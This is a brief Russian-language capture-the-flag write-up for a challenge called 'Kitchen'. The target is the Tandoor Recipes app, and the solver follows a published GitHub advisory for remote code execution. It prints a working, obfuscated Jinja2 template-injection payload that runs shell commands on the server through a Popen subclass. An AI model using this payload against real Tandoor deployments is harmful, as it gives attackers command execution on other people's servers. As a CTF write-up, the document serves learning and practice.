# Kitchen
решил <a href="https://t.me/bazonavt">@bazonavt</a>

1. Региструемся, исследуем сервис
2. Нажав на иконку пользователя в правом врехнем углу, видим, что есть Github
3. Заходим в Security, переходим по эксплоиту <a href="https://github.com/TandoorRecipes/recipes/security/advisories/GHSA-r6rj-h75w-vj8v">RCE</a> (так как в задании просят запустить `print_flag`)
4. Делаем `ls -aR /`:
```
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('ls -aR',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
```
5. Через `Ctrl+F` находим директорию, где расположен `print_flag`
6. Аналогично запускаем `print_flag` и получаем флаг
